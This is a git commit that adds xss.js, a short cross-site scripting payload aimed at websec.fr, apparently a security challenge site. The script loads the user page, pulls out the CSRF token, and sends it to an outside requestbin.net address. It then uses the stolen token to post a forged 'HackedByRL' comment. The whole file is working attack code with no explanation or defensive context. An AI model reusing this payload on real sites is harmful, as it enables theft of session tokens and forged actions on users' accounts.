908d46bdeef31ed807025585c176db29f540dbf8
Nokline <75624264+Nokline@users.noreply.github.com>
2022-03-04 07:40:11 -0500

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,10 @@
+alert("Xss started...");
+var r = new XMLHttpRequest();
+r.open("GET", "http://websec.fr/user", false);
+r.send(null);
+document.body.innerHTML = r.responseText;
+var c = document.forms[1][1].value;
+document.location = `http://requestbin.net/r/7kkfwjhw/${c}`;
+r.open("POST", "http://websec.fr/user", true);
+r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+r.send(`comment=HackedByRL&csrf=${encodeURIComponent(c)}&save=submit`);
